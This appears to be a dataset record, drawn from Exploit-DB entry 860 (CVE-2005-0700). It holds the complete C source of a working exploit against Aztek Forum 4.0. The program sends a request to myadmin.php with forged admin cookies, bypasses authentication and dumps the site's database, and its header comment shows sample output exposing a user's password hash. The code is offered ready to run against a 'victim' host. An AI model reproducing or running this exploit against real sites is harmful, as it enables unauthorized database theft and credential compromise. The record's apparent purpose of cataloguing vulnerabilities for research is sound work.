{
  "id": "860",
  "title": "Aztek Forum 4.0 - &#039;myadmin.php&#039; Database Dumper",
  "cve": "CVE-2005-0700",
  "vuln_type": "rce",
  "code": "/* Changed line 81 - Tested and working /str0ke */\r\n\r\n/*\r\n *   LOTFREE Team presents :\r\n * Forum-Aztek v4.0 (4nd pr0b4bly inf3ri0r) Database Dump Xpl0it\r\n * 0day dUd3 X-)\r\n *\r\n * ./aztek-sploit 127.0.0.1 admin forum\r\n * HTTP/1.1 200 OK\r\n * Date: Sat, 05 Mar 2005 22:18:13 GMT\r\n * Server: Apache/2.0.50 (Ubuntu) PHP/4.3.8\r\n * X-Powered-By: PHP/4.3.8\r\n * Set-Cookie: ATK_ADMIN=\r\n * Expires: Sat, 05 Mar 2005 22:18:13 GMT\r\n * Content-Disposition: attachment; filename=\"backup-admin-2005-5-03-23-18-13.sql\"\r\n * Connection: close\r\n * Transfer-Encoding: chunked\r\n * Content-Type: application/force-download\r\n *\r\n * (...)\r\n * INSERT INTO atk_users VALUES ('admin','admin','atm5zzHCTXNkc',0,'',0,0,0,'','',0,0,'','',1109861125,63,'0','','','','','',0,0,'');\r\n *                            password in DES ---+^^^^^^^^^^^^^\r\n * (...)\r\n * sw333333t !\r\n * http://lotfree.next-touch.com\r\n */\r\n#include <stdlib.h>\r\n#include <unistd.h>\r\n#include <stdio.h>\r\n#include <sys/types.h>\r\n#include <sys/socket.h>\r\n#include <errno.h>\r\n#include <netinet/in.h>\r\n#include <netdb.h>\r\n#include <arpa/inet.h>\r\n#include <string.h>\r\n\r\n#define REQ1 \"/myadmin.php?action=export_index&login=\"\r\n#define REQ2 \" HTTP/1.1\\nHost: \"\r\n#define REQ3 \"\\nCookie: ATK_ADMIN=blah; ATK_LOGIN=\"\r\n#define REQ4 \"\\nConnection: close\\n\\n\"\r\n\r\nunsigned long resolve (char *host) \r\n{\r\n  struct in_addr in; \r\n  struct hostent *he; \r\n\t    \r\n  if((in.s_addr=inet_addr(host))==-1) \r\n  { \r\n    if((he=(struct hostent*)gethostbyname(host))==NULL) \r\n    { \r\n      herror(\"Resolving victim host\"); \r\n      exit(1); \r\n    } \r\n    memcpy((caddr_t)&in, he->h_addr, he->h_length); \r\n  }\r\n  return(in.s_addr); \r\n}\r\n\r\nint main(int argc,char *argv[])\r\n{\r\n  int sock;\r\n  struct sockaddr_in sin;\r\n  char c;\r\n\r\n  if(argc!=4)\r\n  {\r\n    printf(\"[*]--------------------------------[*]\\n\");\r\n    printf(\" | Aztek-Forum Database Dump Xploit |\\n\");\r\n    printf(\" |   sirius_black // LOTFREE Team   |\\n\");\r\n    printf(\"[*]--------------------------------[*]\\n\\n\");\r\n    printf(\"Usage: %s <victim> <admin_login> <forum_directory>\\n\\n\",argv[0]);\r\n    printf(\"Exemple: %s www.tictactoe.com admin forum > database.sql\\n\\n\",argv[0]);\r\n    exit(1);\r\n  }\r\n  if((sock=socket(PF_INET,SOCK_STREAM,0))==-1)\r\n  {\r\n    perror(\"socket\");\r\n    exit(1);\r\n  }\r\n  sin.sin_family=AF_INET;\r\n  sin.sin_port=htons(80);\r\n  sin.sin_addr.s_addr=resolve(argv[1]);//  sin.sin_addr.s_addr=resolve(\"127.0.0.1\");\r\n  if(connect(sock,(struct sockaddr*)&sin,sizeof(struct sockaddr))==-1)\r\n  {\r\n    perror(\"connect\");\r\n    exit(1);\r\n  }\r\n  send(sock,\"GET /\",5,0);\r\n  send(sock,argv[3],strlen(argv[3]),0);\r\n  send(sock,REQ1,sizeof(REQ1)-1,0);\r\n  send(sock,argv[2],strlen(argv[2]),0);\r\n  send(sock,REQ2,sizeof(REQ2)-1,0);\r\n  send(sock,argv[1],strlen(argv[1]),0);\r\n  send(sock,REQ3,sizeof(REQ3)-1,0);\r\n  send(sock,argv[2],strlen(argv[2]),0);\r\n  send(sock,REQ4,sizeof(REQ4)-1,0);\r\n  while((recv(sock,&c,1,0))==1)\r\n  {\r\n    putchar(c);\r\n  }\r\n  close(sock);\r\n  return 0;\r\n}\r\n\r\n// milw0rm.com [2005-03-07]",
  "url": "https://www.exploit-db.com/exploits/860"
}